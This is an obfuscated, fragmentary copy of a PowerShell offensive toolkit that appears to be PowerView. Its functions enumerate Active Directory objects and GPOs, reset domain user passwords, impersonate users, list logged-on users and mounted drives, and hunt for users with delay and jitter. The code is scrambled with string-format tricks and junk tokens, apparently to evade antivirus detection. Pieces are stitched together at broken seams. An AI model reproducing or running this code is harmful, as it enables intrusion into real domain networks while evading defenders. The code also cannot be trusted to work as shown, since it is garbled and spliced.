                YoV{sIJKeaRCIJKhsTrIJKIng} = S5zS5z
            }
            else {
                if (YoV{sIJKeIJKArIJKChbAse} -match (Z3b{0}{2}{1}Z3b-fS5z^LDS5z,S5zP://S5z,S5zAS5z)) {
                    if (YoV{',' {
                        YoV{OIJKBjecIJKTDN}.(Z3b{1}{2}{0}Z3b -f S5ztringS5z,S5zSubS5z,S5zSS5z).Invoke(YoV{ObIJKJIJKEctdn}.(Z3b{0}{1}Z3b-fS5zIndexS5z,S5zOfS5z).Invoke(Z3bYoV(YoV_),Z3b))
                    }
                }
                &(Z3b{0}{1}{2}{3}Z3b -f S5zWritS5z,S5ze-S5z,S5zVerS5z,S5zboseS5z) (S5z[Get-DS5z+S5zomS5z+S5zainGPOS5z+S5z] S5z+S5zobjeS5z+S5zct S5z+S5zOUS5z+S5zs: S5z+Z3bYoVObjectOUsZ3b)

                if (YoV{oBjEIJKcIJKToUs}) {
                    
                    YoV{seArcHIJKErIJKAIJKRgIJKUMenTS}.(Z3b{0}{1}Z3b -fS5zReS5z,S5zmoveS5z).Invoke((Z3b{0}{3}{2}{1}Z3b -fS5zPS5z,S5zertiesS5z,S5zpS5z,S5zroS5z))
                    YoV{IIJKNIJKherITAnCeDIJKisAIJKBlEd} = YoV{fIJKAlSe}
                    ForEach(YoV{oIJKBJIJKECtIJKoU} in YoV{obIJKJEIJKCtIJKouS}) {
                        YoV{seIJKARIJKCIJKhEraRgUMENTs}[(Z3b{1}{0}Z3b-fS5ztyS5z,S5zIdentiS5z)] = YoV{oIJKBjECIJKTou}
                        YoV{GIJKpoIJKADsPAThs} += &(Z3b{0}{3}{2}{1}Z3b-fS5zGeS5z,S5zUS5z,S5zOS5z,S5zt-DomainS5z) @SearcherArguments JGO &(Z3b{3}{1}{2}{0}Z3b-f S5ztS5z,S5zrEaS5z,S5zch-ObjecS5z,S5zFoS5z) {
                            
                            if (YoV{_}.Z3bGIJKPLinkZ3b) {
','zes.DirectoryEntryS5z,S5zectoryS5z)(YoV{SEIJKAIJKRchSTrinG}, YoV{CREDenTIJKIIJKAL}.Z3bUseRIJKNAIJKMeZ3b, YoV{cReDeIJKNIJKTIAL}.(Z3b{0}{2}{4}{3}{1}Z3b -fS5zGS5z,S5zentialS5z,S5zetNetwS5z,S5zredS5z,S5zorkCS5z).Invoke().Z3bpasIJKswoIJKRDZ3b)
            YoV{sEarIJKCIJKHEr} = &(Z3b{0}{1}{2}Z3b -fS5zNeS5z,S5zw-OS5z,S5zbjectS5z) (Z3b{1}{4}{2}{0}{3}{7}{5}{6}Z3b-f S5zes.S5z,S5zSystem.DiS5z,S5zoryServicS5z,S5zDirectorS5z,S5zrectS5z,S5zearS5z,S5zcherS5z,S5zySS5z)(YoV{DOMaIJKiIJKNOBJEct})
        }
        else {
            
            YoV{sIJKEarCIJKheR} = &(Z3b{2}{0}{1}Z3b -f S5zbjeS5z,S5zctS5z,S5zNew-OS5z) (Z3b{3}{10}{6}{2}{4}{0}{9}{5}{8}{7}{1}Z3b -f S5zviceS5z,S5zcherS5z,S5z.DirS5z,S5zSysS5z,S5zectorySerS5z,S5zrS5z,S5zmS5z,S5zearS5z,S5zySS5z,S5zs.DirectoS5z,S5zteS5z)([ADSI]YoV{sEAIJKRCHIJKsTIJKRiNg})
        }

        YoV{SeIJKARIJKchEr}.Z3bPaIJKGIJKesizeZ3b = YoV{rIJKEIJKSIJKULTpagESIIJKze}
        YoV{SIJKEIJKArcIJKHEr}.Z3bsEaIJKRIJKcHsCoPEZ3b = YoV{SEaIJKRchSIJKCOIJKpe}
        YoV{SeIJKAIJKRCIJKhER}.Z3bcaIJKchEresUIJKLTsZ3b = YoV{fIJKAlSe}
        YoV{SIJKeaRcIJKHEr}.Z3bRIJKeIJKFerraLcHaIJKsIJKInGZ3b =  (&(Z3b{1}{0}Z3b-fS5ziTEMS5z,S5zCHIlDS5z) (Z3bVAriZ3b+Z3babZ3b+Z','XTArGUMIJKENTs} = @{ (Z3b{1}{0}{2}Z3b-f S5zdentiS5z,S5zIS5z,S5ztyS5z) = YoV{iIJKdIJKEntIty} }
    if (YoV{PsbOuNIJKDPARAMIJKETEIJKRs}[(Z3b{0}{1}Z3b -f S5zDS5z,S5zomainS5z)]) { YoV{coNIJKTIJKEXIJKTarGUMIJKEnTS}[(Z3b{1}{2}{0}Z3b -f S5znS5z,S5zDoS5z,S5zmaiS5z)] = YoV{doMIJKAIJKiN} }
    if (YoV{psbOIJKUnIJKdIJKpArAMIJKETIJKErS}[(Z3b{1}{0}{2}Z3b-fS5zdentS5z,S5zCreS5z,S5zialS5z)]) { YoV{CoIJKNTExtIJKArGIJKUmEIJKNts}[(Z3b{1}{0}{2}Z3b -fS5zedentiaS5z,S5zCrS5z,S5zlS5z)] = YoV{crIJKEdeIJKNTIJKIaL} }
    YoV{CIJKONtext} = &(Z3b{0}{2}{4}{1}{3}Z3b -f S5zGeS5z,S5zalConS5z,S5zt-PrinS5z,S5ztextS5z,S5zcipS5z) @ContextArguments

    if (YoV{COIJKNTEXt}) {
        YoV{UIJKSER} = [System.DirectoryServices.AccountManagement.UserPrincipal]::(Z3b{4}{1}{2}{0}{3}Z3b -fS5zntiS5z,S5zdByIS5z,S5zdeS5z,S5ztyS5z,S5zFinS5z).Invoke(YoV{coNTeIJKXt}.Z3bcOIJKNTeIJKxTZ3b, YoV{idIJKEIJKNTity})

        if (YoV{USIJKER}) {
            &(Z3b{0}{3}{2}{1}Z3b-fS5zWS5z,S5zte-VerboseS5z,S5ziS5z,S5zrS5z) (S5z[SS5z+S5zet-DS5z+S5zomaiS5z+S5znUserPS5z+S5zasS5z+S5zsword] S5z+S5zAttemS5z+S5zptiS5z+S5zng S5z+S5ztoS5z+S5z S5z+S5zsetS5z+S5z S5z+S5ztheS5z+S5z S5z+S5zpasswoS5z+S5zrdS5z+S5z S5z+S5zforS5z+S5z S5z+S5zusS5z+S5zer S5z+Z3bS5zYoVIdentityS5zZ3b)
            try {
                YoV{TIJKeMpIJKcRed} = &(Z3b{0}{2}{1}Z3b-f S5zNeS5z,S5z-ObjectS5z,S5zwS5z) (Z3b{8}{1}{5}{7}{3}{4}{2}{0}{9}{6}Z3b -f S5zSCredS5z,S5ztS5z,S5zon.PS5z,S5zageS5z,S5zment.AutomatiS5z,S5zem.S5z,S5ztialS5z,S5zManS5z,S5zSysS5z,S5zenS5z)(S5zaS5z, YoV{AccOIJKUIJKNtIJKpaSSwoIJKRd})
                YoV{UIJKsEr}.(Z3b{3}{2}{0}{1}Z3b -fS5ztPassS5z,S5zwordS5z,S5zeS5z,S5zSS5z).Invoke(YoV{tIJKEmPIJKcrEd}.(Z3b{0}{1}{2}{4}{3}Z3b-f S5zGetNeS5z,S5ztworkCS5z,S5zredenS5z,S5zialS5z,S5ztS5z).Invoke().Z3bPASSIJKWOIJKRDZ3b)

                YoV{nuIJKll} = YoV{uIJKsER}.(Z3b{1}{0}Z3b-f S5zveS5z,S5zSaS5z).Invoke()
                &(Z3b{2}{0}{1}{3}Z3b -f S5z-S5z,S5zVerboS5z,S5zWriteS5z,S5zseS5z) (S5z[Set-DoS5z+S5zmaiS5z+S5znS5z+S5zUseS5z+S5zrPaS5z+S5zsswordS5z+S5z] S5z+S5zPasS5z+S5zswS5z+S5zord S5z+S5zfoS5z+S5zr S5z+S5zusS5z+S5zer S5z+Z3bS5zYoVIdentityS5z Z3b+S5zsuccessfS5z+S5zullS5z+S5zy S5z+S5zrS5z+S5zesetS5z)
            }
            catch {
                &(Z3b{2}{0}{1}Z3b -fS5zteS5z,S5','S5znd!S5z)
                    }
                    YoV{ObjIJKEcIJKTdN} = YoV{UIJKSEr}.Z3bDIIJKsTiNgIJKUIJKisHIJKeDnAMEZ3b
                }

                
                YoV{oBJecIJKToIJKUS} = @()
                YoV{OIJKBjeCTIJKOuS} += YoV{OIJKBJeIJKcTDn}.(Z3b{1}{0}Z3b -f S5zitS5z,S5zsplS5z).Invoke(S5z,S5z) JGO &(Z3b{0}{1}{2}Z3b-f S5zFS5z,S5zorEach-ObjS5z,S5zectS5z) {
                    if(YoV{_}.(Z3b{2}{0}{1}Z3b-fS5ztartswS5z,S5zithS5z,S5zsS5z).Invoke(S5zOU=S5z))','z,S5zddS5z).Invoke(YoV{pAraIJKMIJKeteIJKRoptIoIJKNs})
                        }
                        Catch { YoV{_} }
                        continue
                    }
                    YoV{aLiASRIJKeIJKGEx} {
                        Try {
                            YoV{PaIJKRaMIJKetEralIJKIIJKAS} = &(Z3b{1}{0}{2}Z3b-fS5z-ObS5z,S5zNewS5z,S5zjectS5z) -TypeName (Z3b{2}{7}{1}{0}{6}{4}{5}{3}Z3b-f S5zmS5z,S5ztoS5z,S5zSystem.ManS5z,S5ztributeS5z,S5ziasAS5z,S5ztS5z,S5zation.AlS5z,S5zagement.AuS5z) -ArgumentList (. YoV{gEIJKTvIJKAr}) -ErrorAction (Z3b{1}{0}Z3b -f S5zpS5z,S5zStoS5z)
                            YoV{attrIJKiButECIJKOllIJKectIJKiON}.(Z3b{1}{0}Z3b -f S5zdS5z,S5zAdS5z).Invoke(YoV{paRaIJKMETIJKeRIJKAlIIJKAs})
                            continue
                        }
                        Catch { YoV{_} }
                    }
                }
                YoV{atTriBUtIJKeCIJKOIJKlLEcIJKTiIJKOn}.(Z3b{1}{0}Z3b-f S5zddS5z,S5zAS5z).Invoke(YoV{PIJKAramIJKetERaTtIJKRIJKIIJKBIJKUTe})
                YoV{pIJKARaIJKmIJKEtER} = &(Z3b{2}{3}{1}{0}Z3b -fS5zectS5z,S5zbjS5z,S5zNewS5z,S5z-OS5z) -TypeName (Z3b{5}{1}{4}{9}{7}{3}{8}{2}{6}{0}Z3b -fS5zrS5z,S5zm.S5z,S5z','}{3}{7}Z3b-fS5zPS5z,S5zsS5z,S5zOnUS5z,S5zeS5z,S5z.LoggeS5z,S5zdS5z,S5zowerViewS5z,S5zrInfoS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITIon = 0, ValUefROMPiPeline = YoV{TRIJKUE}, vaLuefROmpipElInEByProPErTYnaMe = YoV{tIJKRuE})]
        [Alias({Z3b{1}{0}Z3b-fS5zeS5z,S5zHostNamS5z}, {Z3b{2}{1}{0}Z3b-f S5znameS5z,S5znshostS5z,S5zdS5z}, {Z3b{1}{0}Z3b-fS5zeS5z,S5znamS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{COMpuTIJKeIJKRIJKNAmE} = (Z3b{0}{1}{2}Z3b -fS5zlS5z,S5zocalhoS5z,S5zstS5z),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKREIJKDIJKenTIal} =  ( &(Z3b{3}{0}{1}{2}Z3b-fS5z-S5z,S5zVarS5z,S5ziABlES5z,S5zgetS5z)  (S5zJS5z+S5zfiS5z)).Z3bvAIJKLuEZ3b::Z3bEmIJKptYZ3b
    )

    BEGIN {
        if (YoV{PIJKsIJKBoUNDPIJKAraMEIJKTeRS}[(Z3b{2}{1}{0}{3}Z3b -fS5zentS5z,S5zredS5z,S5zCS5z,S5zialS5z)]) {
            YoV{lIJKOGIJKOnIJKTokeN} = &(Z3b{1}{5}{3}{4}{0}{2}{6}Z3b-f S5zsonatS5z,S5zInvoke-US5z,S5zioS5z,S5zrImpS5z,S5zerS5z,S5zseS5z,S5znS5z) -Credential YoV{credIJKentIJKIaL}
        }
    }

    PROCESS {
        ForEach (YoV{CoIJKMpuIJKTER} in YoV{cOIJKMpuTIJKeRNaMe}) {
            
            YoV{qUEIJKRYLeIJKVIJKeL} = 1
            YoV{PIJKTriNIJKFO} =  ( &(Z3b{0}{3}{1}{2}Z3b -f S5zGES5z,S5z-VaS5z,S5zRiABLES5z,S5zTS5z)  6Rk25p ).Z3bvAIJKluEZ3b::Z3bzEIJKRoZ3b
            YoV{EnIJKTrIJKieSreaD} = 0
            YoV{TotAIJKLIJKREaD} = 0
            YoV{ResUIJKmeIJKhAnDIJKLE} = 0

            
            YoV{RIJKeIJKsulT} = YoV{nEtIJKAIJKpIIJK32}::Z3bnIJKETIJKWkIJKsTauSIJKeRenumZ3b(YoV{cIJKoMpUTEr}, YoV{qUIJKEIJKRyLEVEl}, [ref]YoV{PtrIJKinIJKFo}, -1, [ref]YoV{ENtrIJKiESrEIJKAD}, [ref]YoV{tOIJKTAIJKlREAd}, [ref]YoV{RIJKEsumeHanIJKDlE})

            
            YoV{OFIJKFIJKSeT} = YoV{PTrIJKiNFo}.(Z3b{0}{1}Z3b -fS5zToS5z,S5zInt64S5z).Invoke()

            
            if ((YoV{RIJKesULt} -eq 0) -and (YoV{OFIJKFSET} -gt 0)) {

                
                YoV{iNCIJKREIJKmEnt} = YoV{WIJKKsTIJKA_UsIJKeRIJK_IJKInFO_1}::(Z3b{0}{1}Z3b -fS5zGetSiS5z,S5zzeS5z).Invoke()

                
                for (YoV{I} = 0; (YoV{i} -lt YoV{entrIJKIESREIJKAd}); YoV{i}++) {
                    
                    YoV{NIJKeIJKwiNTpIJKTr} = &(Z3b{1}{2}{0}Z3b -f S5zbjectS5z,S5zNewS5z,S5z-OS5z) (Z3b{1}{0}{2}{3}Z3b -f S5zem.In','    YoV{DOMAInTIJKRIJKUIJKst}
                    }
                }
                
                YoV{nUIJKll} = YoV{nIJKeIJKTapi32}::(Z3b{0}{2}{1}Z3b -fS5zNetApiBufferS5z,S5zeeS5z,S5zFrS5z).Invoke(YoV{pIJKTRiNIJKFo})
            }
            else {
                &(Z3b','S5z,S5zzeS5z)] = YoV{resIJKUIJKlIJKTPaIJKgEsIZe} }
        if (YoV{PIJKsBOUIJKNdPArAIJKMeTers}[(Z3b{1}{2}{0}Z3b -f S5zmeLimitS5z,S5zSeS5z,S5zrverTiS5z)]) { YoV{SIJKeIJKARCHIJKEraRGUMENIJKTS}[(Z3b{3}{4}{1}{0}{2}Z3b-f S5zeLimS5z,S5zrTimS5z,S5zitS5z,S5zSS5z,S5zerveS5z)] = YoV{serV','JKUpmAIJKpPIIJKNG} JGO &(Z3b{2}{1}{0}Z3b -fS5zberS5z,S5zmS5z,S5zAdd-MeS5z) (Z3b{1}{0}{2}{3}Z3b -fS5zeS5z,S5zNotS5z,S5zpropertS5z,S5zyS5z) (Z3b{0}{1}Z3b -f S5zObjectSS5z,S5zIDS5z) YoV{oBJeIJKCt}.Z3boIJKBIJKJIJKecTsIdZ3b
                    YoV{gIJKPoloCaLIJKgrOIJKUpmIJKApIJKpINg} JGO &(Z3b{0}{1}{2}Z3b -f S5zAdS5z,S5zd-MeS5z,S5zmberS5z) (Z3b{1}{2}{3}{0}Z3b -f S5ztyS5z,S5zNotS5z,S5zepropS5z,S5zerS5z) (Z3b{1}{0}{2}Z3b-fS5zsGrouS5z,S5zIS5z,S5zpS5z) YoV{ISIJKGrOuP}
                    YoV{GIJKpoLOCAIJKLgRoIJKUPmAPPIJKiNG} JGO &(Z3b{0}{1}{2}Z3b -f S5zAdd-MS5z,S5zembeS5z,S5zrS5z) (Z3b{2}{1}{3}{0}Z3b -f S5zrtyS5z,S5ztS5z,S5zNoS5z,S5zepropeS5z) (Z3b{1}{0}{2}Z3b-fS5zaiS5z,S5zDomS5z,S5znS5z) YoV{DIJKOIJKMaIN}
                    YoV{gpOIJKlOcIJKAlIJKgROUpIJKmApPIng} JGO &(Z3b{2}{1}{3}{0}Z3b -f S5zerS5z,S5z-MS5z,S5zAddS5z,S5zembS5z) (Z3b{2}{1}{0}{3}Z3b-fS5zeS5z,S5ztS5z,S5zNoS5z,S5zpropertyS5z) (Z3b{2}{3}{1}{0}Z3b-fS5zameS5z,S5zisplayNS5z,S5zGS5z,S5zPODS5z) YoV{gPoIJKNIJKAmE}
                    YoV{gIJKpIJKolIJKoIJKCaIJKLgroUPMAppiNg} JGO &(Z3b{1}{2}{0}Z3b-fS5zerS5z,S5zAdd-S5z,S5zMembS5z) (Z3b{1}{0}{2}Z3b -fS5ztepropS5z,S5zNoS5z,S5zertyS5z) (Z3b{1}{2}{0}Z3b -fS5zidS5z,S5zGS5z,S5zPOGuS5z) YoV{GPOIJKGuID}
                    YoV{GPoLIJKoCAIJKLIJKGRIJKOupIJKmAIJKPPIng} JGO &(Z3b{0}{2}{1}Z3b-f S5zAS5z,S5zrS5z,S5zdd-MembeS5z) (Z3b{2}{1}{0}Z3b-f S5zropertyS5z,S5zepS5z,S5zNotS5z) (Z3b{0}{1}Z3b-f S5zGPS5z,S5zOPathS5z) YoV{gpOPAIJKTh}
                    YoV{GIJKpOLOIJKCalGIJKROuIJKpMAPPiIJKNG} JGO &(Z3b{1}{3}{2}{0}Z3b -fS5zrS5z,S5zAdd-MeS5z,S5zeS5z,S5zmbS5z) (Z3b{0}{2}{1}Z3b -fS5zNoteS5z,S5zertyS5z,S5zpropS5z) (Z3b{0}{1}{2}Z3b -fS5zGPS5z,S5zOTypS5z,S5zeS5z) YoV{gpoTIJKyIJKPE}
                    YoV{GPOIJKLOCAlIJKGROIJKUPmIJKApIJKpIIJKNG} JGO &(Z3b{2}{1}{0}Z3b-f S5zmberS5z,S5zeS5z,S5zAdd-MS5z) (Z3b{2}{1}{3}{0}Z3b-f S5zrtyS5z,S5ztepS5z,S5zNoS5z,S5zropeS5z) (Z3b{0}{1}{2}Z3b-f S5zContainerS5z,S5zNS5z,S5zameS5z) YoV{_}.Z3bDIJKIsTIJKinGuIJKIIJKShEIJKDnAMEZ3b
                    YoV{gpIJKOIJKLIJKocAlGRouPMaPpIJKIIJKNg} JGO &(Z3b{1}{2}{0}{3}Z3b -fS5zMembS5z,S5zAddS5z,S5z-S5z,S5zerS5z) (Z3b{0}{3}{1}{2}Z3b-fS5zNoteprS5z,S5zpeS5z,S5zrtyS5z,S5zoS5z) (Z3b{0}{2}{1}Z3b -fS5zCompS5z,S5zeS5z,S5zuterNamS5z) YoV{_}.Z3bSIJKItEIJKObjEcTIJKBlZ3b
                    YoV{GPoLIJKOCAIJKLgIJKRIJKOupIJKmAPpinG}.Z3bPIJKSOIJKBjeCtZ3b.Z3bTIJKypENIJKAMESZ3b.(Z3b{0}{1}Z3b-f S5zAdS5z,S5zdS5z).Invoke((Z3b{3}{1}{7}{0}{6}{5}{2}{4}Z3b -f S5zOS5z,S5zw.S5z,S5zMS5z,S5zPowerVieS5z,S5zappingS5z,S5zlGroupS5z,S5zLocaS5z,S5zGPS5z))
                    YoV{GpoLoCALgIJKROIJKUPIJKmIJKAIJKppIIJKNg}
                }
            }
        }
    }
}


function GEIJKT-dIJKomaIJKiNGpoCOmIJKpuIJKTEIJKRLIJKoCalIJKGrOuPmAPpiNg {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{1}{0}Z3b -fS5zessS5z,S5zocS5z,S5zPSShouldPrS5z}, S5zS5z)]
    [OutputType({Z3b{2}{4}{3}{7}{6}{8}{1}{10}{11}{9}{0}{5}Z3b-fS5zlGrouS5z,S5zmS5z,S5zPoweS5z,S5zVieS5z,S5zrS5z,S5zpMemberS5z','maS5z)]) { YoV{pRINCIPIJKALIJKSEArcHeraIJKRIJKGIJKUMEIJKNTs}[(Z3b{2}{0}{1}Z3b-f S5zaS5z,S5zinS5z,S5zDomS5z)] = YoV{PRIJKiIJKNCipAIJKLDoMaIN} }
        if (YoV{pSIJKBounDPaIJKRIJKAmEIJKTERs}[(Z3b{0}{1}Z3b -fS5zSerS5z,S5zverS5z)]) { YoV{pIJKRinCiIJKPIJKAlsEIJKArChIJKERArgUmEIJKNTS}[(Z3b{0}{1}{2}Z3b -f S5zSerS5z,S5zvS5z,S5zerS5z)] = YoV{SIJKeRvER} }
        if (YoV{pIJKsboUnDParIJKAIJKmETIJKers}[(Z3b{2}{0}{1}Z3b -fS5zchScS5z,S5zopeS5z,S5zSearS5z)]) { YoV{PIJKRIIJKNCIpalIJKSeIJKAIJKRCheRaRgumenTs}[(Z3b{1}{0}{2}Z3b-fS5zarcS5z,S5zSeS5z,S5zhScopeS5z)] = YoV{sEaIJKRIJKcIJKhSCoPe} }
        if (YoV{PSIJKBoIJKUNdPAIJKRAmeIJKTEIJKRS}[(Z3b{0}{1}{2}{3}Z3b-f S5zResultS5z,S5zPagS5z,S5zeSS5z,S5zizeS5z)]) { YoV{prIJKiNcIJKIpIJKAlIJKsEarCHeRArGIJKUIJKmIJKeIJKNTs}[(Z3b{1}{0}{2}{3}Z3b -fS5zesultPS5z,S5zRS5z,S5zaS5z,S5zgeSizeS5z)] = YoV{rIJKEsultPIJKAIJKGESizE} }
        if (YoV{PSbIJKOuIJKNDIJKpArIJKAMeTerS}[(Z3b{1}{0}{2}{3}Z3b-fS5zrS5z,S5zSeS5z,S5zverTimeS5z,S5zLimitS5z)]) { YoV{PRInciIJKpAlSIJKEIJKArchEIJKRARGumIJKeIJKNIJKTS}[(Z3b{1}{0}{3}{2}Z3b-fS5zrTimS5z,S5zServeS5z,S5zmitS5z,S5zeLiS5z)] = YoV{SERVEIJKRIJKTiMELIMIJKit} }
        if (YoV{PsbIJKOUnDIJKPaIJKRIJKAIJKMeteRs}[(Z3b{2}{1}{0}Z3b-fS5ztoneS5z,S5zbsS5z,S5zTomS5z)]) { YoV{pRInIJKciPalSEaIJKRIJKcHErIJKARGUMEIJKNIJKTS}[(Z3b{2}{1}{0}Z3b -f S5zneS5z,S5zmbstoS5z,S5zToS5z)] = YoV{toIJKmBIJKsTIJKONe} }
        if (YoV{pSIJKBIJKouNdPAIJKRaIJKmeTERs}[(Z3b{1}{2}{0}Z3b -fS5zialS5z,S5zCrS5z,S5zedentS5z)]) { YoV{PrIIJKNcIIJKpalseIJKArCIJKHeRARIJKGUmEnTs}[(Z3b{0}{2}{1}Z3b -f S5zCreS5z,S5zentialS5z,S5zdS5z)] = YoV{CrIJKEdIJKEIJKNtiAl} }
        YoV{PRinCIJKipIJKAls} = &(Z3b{0}{4}{2}{1}{5}{3}Z3b -fS5zGS5z,S5ziS5z,S5zaS5z,S5ztS5z,S5zet-DomS5z,S5znObjecS5z) @PrincipalSearcherArguments
        if (-not YoV{pRIJKINCIJKipalS}) {
            throw (S5zUnS5z+S5zableS5z+S5z S5z+S5ztS5z+S5zo S5z+S5zresolS5z+S5zveS5z+S5z S5z+S5zpriS5z+S5zncipalS5z+S5z: S5z+Z3bYoVPrincipalIdentityZ3b)
        }
    }

    PROCESS {
        YoV{tarGIJKETIJKSeARIJKcHEraIJKRgumIJKEnTs}[(Z3b{0}{1}{2}Z3b -fS5zIS5z,S5zdentiS5z,S5ztyS5z)] = YoV{tIJKArGIJKeIJKTIIJKDentitY}
        YoV{TaIJKRIJKGets} = &(Z3b{2}{0}{3}{1}{4}Z3b-f S5z-DomaS5z,S5zObjS5z,S5zGetS5z,S5zinS5z,S5zectS5z) @TargetSearcherArguments

        ForEach (YoV{TIJKArGIJKeTObIJKJEcT} in YoV{tIJKArGIJKETS}) {

            YoV{InHEIJKRIIJKTaIJKNIJKcEtyPe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] (Z3b{0}{1}Z3b -f ','3b(([chaR]48+[chaR]71+[chaR]111),[StRiNg][chaR]36)) }

                ForEach (YoV{uSEIJKRIJKSiD} in YoV{uIJKsERIJKSIDs}) {
                    try {
                        if (YoV{pIJKSbOUNdparAMIJKeTeIJKRs}[(Z3b{1}{2}{0}Z3b-f S5zlS5z,S5zCredentS5z,S5ziaS5z)]) {
                            YoV{uIJKSERnIJKAmE} = &(Z3b{1}{4}{2}{0}{3}Z3b-f S5zIS5z,S5zCS5z,S5zSS5z,S5zDS5z,S5zonvertFrom-S5z) -ObjectSid YoV{uIJKSIJKERsid} -Credential YoV{CrEIJKDEIJKNtiIJKAL}
                        }
                        else {
                            YoV{UserIJKNIJKAME} = &(Z3b{0}{3}{1}{4}{2}Z3b -fS5zCoS5z,S5zvertS5z,S5zm-SIDS5z,S5znS5z,S5zFroS5z) -ObjectSid YoV{uIJKSErIJKsiD}
                        }

                        YoV{dIJKRIVIJKEIJKleTteRS} = (YoV{rIJKeG}.(Z3b{2}{0}{1}Z3b -f S5zmKS5z,S5zeyS5z,S5zEnuS5z).Invoke(YoV{HIJKKu}, Z3bYoVUserSID5rjNetworkZ3b)).Z3bsnaMIJKEsZ3b

                        ForEach (YoV{dIJKRiVeleTTIJKEr} in YoV{drIJKiVELETIJKTERs}) {
                            YoV{provIJKIdeRIJKNAMe} = YoV{RIJKeg}.(Z3b{4}{1}{0}{3}{2}Z3b -fS5zinS5z,S5ztStrS5z,S5zValueS5z,S5zgS5z,S5zGeS5z).Invoke(YoV{HIJKKu}, Z3bYoVUserSID5rjNetwork5rjYoVDriveLetterZ3b, (Z3b{1}{2}{3}{0}Z3b -f S5zderNameS5z,S5zPS5z,S5zrovS5z,S5ziS5z)).Z3bsVaIJKLUEZ3b
                            YoV{ReIJKMOTepIJKAtH} = YoV{rIJKEg}.(Z3b{3}{0}{1}{2}Z3b-fS5zringVS5z,S5zalS5z,S5zueS5z,S5zGetStS5z).Invoke(YoV{HIJKKu}, Z3bYoVUserSID5rjNetwork5rjYoVDriveLetterZ3b, (Z3b{2}{0}{1}{3}Z3b -fS5zmoS5z,S5ztePaS5z,S5zReS5z,S5zthS5z)).Z3bSIJKVaLueZ3b
                            YoV{DrIJKiVeIJKUseIJKRIJKNAme} = YoV{rIJKEg}.(Z3b{1}{0}{3}{2}Z3b -fS5zriS5z,S5zGetStS5z,S5zgValueS5z,S5znS5z).Invoke(YoV{HIJKku}, Z3bYoVUserSID5rjNetwork5rjYoVDriveLetterZ3b, (Z3b{1}{0}{2}Z3b -fS5zaS5z,S5zUserNS5z,S5zmeS5z)).Z3bSVAIJKLuEZ3b
                            if (-not YoV{uSIJKEIJKRNAmE}) { YoV{UIJKSerNaMe} = S5zS5z }

                            if (YoV{reMIJKotIJKePaIJKTH} -and (YoV{RIJKEmIJKOtepaIJKTh} -ne S5zS5z)) {
                                YoV{mIJKoUIJKNTEDdrIJKIvE} = &(Z3b{2}{0}{1}Z3b-fS5zew-ObjS5z,S5zectS5z,S5zNS5z) (Z3b{0}{1}Z3b-f S5zPSS5z,S5zObjectS5z)
                                YoV{mIJKOIJKUNIJKTeddriVE} JGO &(Z3b{0}{1}{3}{2}Z3b-f S5zAdS5z,S5zd-MemS5z,S5zerS5z,S5zbS5z) (Z3b{1}{2}{3}{0}Z3b-fS5zyS5z,S5zNoteS5z,S5zpS5z,S5zropertS5z) (Z3b{3}{1}{2}{0}Z3b-f S5zNameS5z,S5zomputeS5z,S5zrS5z,S5zCS5z) YoV{CIJKoMIJKpUtEr}
                                YoV{MOIJKUNTeIJKDIJKdrIVe} JGO &(Z3b{0}{2}{1}Z3b -f S5zAS5z,S5zd-MemberS5z,S5zdS5z) (Z3b{0}{1}{2}Z3b-f S5zNotepropeS5z,S5zrtS5z,S5zyS5z) (Z3b{1}{0}Z3b-fS5zeS5z,S5zUserNamS5z) YoV{uSeRIJKNAIJKmE}
                                YoV{mOUnIJKTEIJKDIJKDIJKRIv','        [ValidateRange(1, 10000)]
        [Int]
        YoV{dIJKeLIJKAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        YoV{jitTIJKer} = .3,

        [Int]
        [ValidateRange(1, 100)]
        YoV{thREIJKAIJKDS} = 20
    )

    BEGIN {
        YoV{USeIJKRIJKSEaRchEIJKRIJKARgIJKUMENIJKTS} = @{
            (Z3b{0}{1}{3}{2}Z3b-f S5zPS5z,S5zroperS5z,S5zsS5z,S5ztieS5z) = (Z3b{4}{2}{1}{3}{0}Z3b -f S5zmeS5z,S5zntS5z,S5zccouS5z,S5znaS5z,S5zsamaS5z)
        }
      ','S5z,S5ztypeS5z),(Z3b{1}{2}{3}{0}Z3b-fS5zflagsS5z,S5zsysS5z,S5zteS5z,S5zmS5z),(Z3b{2}{1}{0}Z3b -f S5zhangedS5z,S5zsncS5z,S5zuS5z),(Z3b{0}{2}{1}Z3b -f S5zusnS5z,S5zreatedS5z,S5zcS5z),(Z3b{1}{2}{0}Z3b-f S5zangedS5z,S5zwS5z,S5zhenchS5z),(Z3b{2}{3}{0}{1}Z3b -fS5zatS5z,S5zedS5z,S5zwhencS5z,S5zreS5z))

        YoV{CompuIJKTeRreFErENIJKCIJKeIJKPrIJKOPERIJKTysEt} = @((Z3b{3}{1}{2}{0}Z3b-f S5zesS5z,S5zuS5z,S5zntexpirS5z,S5zaccoS5z),(Z3b{1}{2}{0}Z3b-fS5zmeS5z,S5zbadpasswoS5z,S5zrdtiS5z),(Z3b{0}{3}{2}{1}Z3b-f S5zbS5z,S5zdcountS5z,S5zdpwS5z,S5zaS5z),S5zcnS5z,(Z3b{2}{1}{0}Z3b-f S5zepageS5z,S5zdS5z,S5zcoS5z),(Z3b{0}{1}{2}Z3b -f S5zcountrS5z,S5zycodS5z,S5zeS5z),(Z3b{1}{2}{4}{3}{5}{0}Z3b -f S5zmeS5z,S5zdiS5z,S5zstinguS5z,S5zhS5z,S5zisS5z,S5zednaS5z),(Z3b{1}{3}{0}{2}Z3b-f S5zshostnaS5z,S5zdS5z,S5zmeS5z,S5znS5z),(Z3b{4}{3}{5}{0}{1}{2}Z3b-f S5ztS5z,S5zionS5z,S5zdataS5z,S5zpagS5z,S5zdscoreproS5z,S5zaS5z),(Z3b{1}{3}{0}{2}Z3b-fS5zpS5z,S5zinS5z,S5zeS5z,S5zstancetyS5z),(Z3b{3}{1}{4}{0}{2}Z3b -fS5zysS5z,S5zcritS5z,S5ztemobjectS5z,S5zisS5z,S5zicalsS5z),(Z3b{2}{0}{1}Z3b-f S5zoS5z,S5zffS5z,S5zlastlogS5z),(Z3b{0}{2}{1}Z3b -f S5zlaS5z,S5zogonS5z,S5zstlS5z),(Z3b{1}{2}{0}{3}Z3b 